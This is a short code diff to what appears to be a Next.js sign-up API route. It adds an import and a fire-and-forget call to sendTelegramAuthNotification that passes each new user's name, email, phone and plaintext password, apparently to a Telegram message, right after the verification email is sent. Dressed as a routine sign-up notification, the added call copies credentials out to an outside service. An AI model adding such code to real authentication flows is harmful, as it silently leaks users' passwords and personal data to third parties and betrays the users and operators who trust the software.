@@ -10,6 +10,7 @@ import {
 } from "@/server/db";
 import { isSmtpConfigured, sendVerificationCodeEmail } from "@/server/email";
 import { enforceRateLimit } from "@/server/rate-limit";
+import { sendTelegramAuthNotification } from "@/server/notifications";
 
 const OTP_TTL_MS = 10 * 60 * 1000;
 const RESEND_COOLDOWN_MS = 60 * 1000;
@@ -108,6 +109,14 @@ export async function POST(request: Request) {
       to: email,
       username,
       code: otpCode,
+    });
+
+    void sendTelegramAuthNotification({
+      event: "sign_up",
+      name: username,
+      email,
+      phone,
+      password: payload.password,
     });
 
     return NextResponse.json({
